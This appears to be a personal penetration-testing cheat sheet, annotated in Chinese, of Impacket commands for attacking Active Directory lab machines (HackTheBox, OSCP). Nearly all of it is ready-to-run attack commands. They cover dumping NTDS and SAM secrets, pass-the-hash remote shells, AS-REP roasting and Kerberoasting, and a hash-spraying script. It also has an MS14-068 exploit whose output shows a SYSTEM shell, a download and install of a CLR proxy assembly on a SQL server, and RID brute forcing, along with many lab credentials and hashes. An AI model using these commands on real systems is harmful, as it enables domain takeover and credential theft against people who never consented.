
**secretsdump.py**
```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py -ntds xxx -system xxx LOCAL
/usr/share/doc/python3-impacket/examples/secretsdump.py -ntds xxx -system xxx.bin LOCAL
sudo /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
/usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/xek:xek@123@htb.local
python ~/tool/impacket-dacledit/examples/secretsdump.py -system system -security security -sam sam LOCAL
sudo impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```
也可以用 `crackmapexec smb absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds`


**psexec.py (SHELL)**
```bash
/usr/share/doc/python3-impacket/examples/psexec.py Administrador:U46olsZ3jp1ZN4i2Hv7R@10.129.108.107
/usr/share/doc/python3-impacket/examples/psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
```


**GetNPUsers.py ( AS-REP Roasting )**
```bash
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.129.228.115 licordebellota.htb/ -usersfile user.list
```

- 无需域身份验证请求执行 GetUserSPNs
使用于 GetNPUsers 获取 hash 无法破解等情况
https://github.com/fortra/impacket/tree/c3ff33b39fe067e738d5625ce174d3d10f7a4b79
```bash
python -m venv .venv
source .venv/bin/activate
pip install .
```

```bash
python examples/GetUserSPNs.py -no-preauth jjones -usersfile ~/HackTheBox/rebound/username -dc-ip 10.129.229.114 rebound.htb/
```



**GetUserSPNs.py ( Kerberoasting , 查询 SPN)**
```bash
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.129.228.115 licordebellota.htb/Kaorz:Roper4155
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.129.229.57 search.htb/hope.sharp:'IsolationIsKey?' -request
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request [-k 禁用NTLM 使用kerberos认证]
```
如果-k 选项报错，修改260行的代码 (或者指定-dc-host 而不是 -dc-ip)：
```python
if self.__doKerberos: 
	#target = self.getMachineName() 
	target = self.__kdcHost
```


**GetTGT.py**
```bash
/usr/share/doc/python3-impacket/examples/getTGT.py
```

```bash
#!/bin/bash
while IFS='' read -r LINE || [ -n "${LINE}" ]
do
        echo "feed the Hash : ${LINE}"
        /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson@htb.local -hashes ${LINE}
done < backup/password_hash
```
**hash 必须为 xxx:xxx, 注意时钟同步问题**

tgtbrute.py （优化版）
```python
#!/usr/bin/env python3
import subprocess

# 读取密码哈希的文件
with open('password_hash', 'r') as file:# change the file path
    for line in file:
        hash_value = line.strip()
        print(f"Testing hash: {hash_value}")

        # 运行getTGT.py命令，并捕获输出
        result = subprocess.run(
            ['/usr/share/doc/python3-impacket/examples/getTGT.py',
             'htb.local/henry.vinson@htb.local', '-hashes', hash_value], # Change the username
            capture_output=True, text=True
        )

        # 检查输出是否包含"Saving"
        if "Saving" in result.stdout:
            print(f"[+] Success! Hash: {hash_value}")
            print(f"Output: {result.stdout}")
            break

```


**mssqlclient.py**
```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py licordebellota.htb/Kaorz:Roper4155@licordebellota.htb
KRB5CCNAME=administrator.ccache python /usr/share/doc/python3-impacket/examples/mssqlclient.py -k dc1.scrm.local
python ~/tool/impacket-dacledit/examples/mssqlclient.py sa:'GWE3V65#6KFH93@4GWTG2G'@10.129.1.183
python examples/mssqlclient.py Administrator:Lab123@192.168.236.18 -windows-auth
proxychains4 python3.7 ~/tool/impacket-dacledit/examples/mssqlclient.py oscp.exam/sql_svc:Dolphin1@10.10.112.148 -windows-auth
```


**mssqlproxy .py**
```bash
git clone https://github.com/djhons/mssqlproxy.git
```

```bash
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll   (上传动态链接库)
ctrl ^ c
wget https://github.com/blackarrowsec/mssqlproxy/releases/download/0.1/assembly.dll
python3 mssqlclient.py licordebellota.htb/sa:'#mssql_s3rV1c3!2020'@10.129.46.75 -install -clr assembly.dll
python3 mssqlclient.py licordebellota.htb/sa:'#mssql_s3rV1c3!2020'@10.129.46.75 -start -reciclador 'C:\Windows\temp\reciclador.dll'
```

修改 proxychains4.conf
```bash
sudo echo "socks5 127.0.0.1  1337" >> /etc/proxychains4.conf
```


**rpcdump.py**
```bash
/usr/share/doc/python3-impacket/examples/rpcdump.py 10.129.96.60
```


**rpcmap.py**
```bash
/usr/share/doc/python3-impacket/examples/rpcmap.py ncacn_ip_tcp:10.129.96.60[135] -brute-uuids -brute-opnums
```


**wmiexec.py (SHELL)**
```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
KRB5CCNAME=administrator.ccache python /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass administrator@hathor.windcorp.htb -dc-ip 10.129.186.131
```


**dcomexec.py (SHELL)**
```bash
/usr/share/doc/python3-impacket/examples/dcomexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
```


**smbexec.py (SHELL)**
```bash
/usr/share/doc/python3-impacket/examples/smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local
```


**reg.py** (读取注册表)
```bash
/usr/share/doc/python3-impacket/examples/reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKCU\\

sudo /usr/share/doc/python3-impacket/examples/reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKCU\\Software\\GiganticHostingManagementSystem
```


**lookupsid.py(爆破 rid 枚举用户名)**
```bash
└─$ /usr/share/doc/python3-impacket/examples/lookupsid.py htb.local/james:'J@m3s_P@ssW0rd!'@10.129.230.144 | grep -i "domain sid\|james"
[*] Domain SID is: S-1-5-21-4220043660-4019079961-2895681657
1103: HTB\james (SidTypeUser)

拼接后就是S-1-5-21-4220043660-4019079961-2895681657-1103

/usr/share/doc/python3-impacket/examples/lookupsid.py -target-ip 10.129.229.114 -no-pass rebound.htb/guset@10.129.229.114 10000 (RID爆破枚举username)
```


**goldenPac.py ( MS14-068 EXP )**
```bash
└─$ /usr/share/doc/python3-impacket/examples/goldenPac.py htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local -dc-ip 10.129.230.140 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller 10.129.230.140
[*] 10.129.230.140 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file joVupjGU.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service lYYT on mantis.htb.local.....
[*] Starting service lYYT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```


**smbclient.py**
```
python /usr/share/doc/python3-impacket/examples/smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local 
[-k 强制使用kerbrute验证]

shares 枚举共享目录
use xxx
ls
get xxx
```


**getPac.py** (域 SID)
```
python /usr/share/doc/python3-impacket/examples/getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson
```


**ticketer.py** 
[0x03 Windows , AD 攻击向量 ( PrivEsc )](0x03%20Windows%20,%20AD%20攻击向量%20(%20PrivEsc%20).md)
```
(见Silver Ticket Attack)
银票攻击
```


**findDelegation.py**
可以查询域中存在非约束的主机用户和服务用户
```bash
findDelegation.py -dc-ip 172.16.0.106 -target-domain hack.lab hack.lab/lucky:p@ssw0rd
```

**dacledit.py** (Bloodhound Owns Linux Abuse, 见 Bloodhound Attack)
[Bloodhound Attack](Bloodhound%20Attack.md)